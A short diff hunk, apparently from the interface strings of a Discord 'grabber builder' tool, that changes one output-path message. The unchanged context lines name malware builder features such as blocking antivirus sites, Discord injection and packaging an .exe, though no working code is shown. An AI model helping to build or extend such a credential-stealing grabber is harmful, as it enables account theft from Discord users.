@@ -253,7 +253,7 @@ BlockAvSites (Y/N)
 DiscordInjection (Y/N)
 File Icon
 Creating {name}.exe, This will take a few seconds. Thanks for your patience!
-File is in 'output/grabberbuilder/{name}.exe
+File is in {path}
 Created groupchat
 Rate limited ({response.json()['retry_after']}ms)
 Not enough friends available for random selection
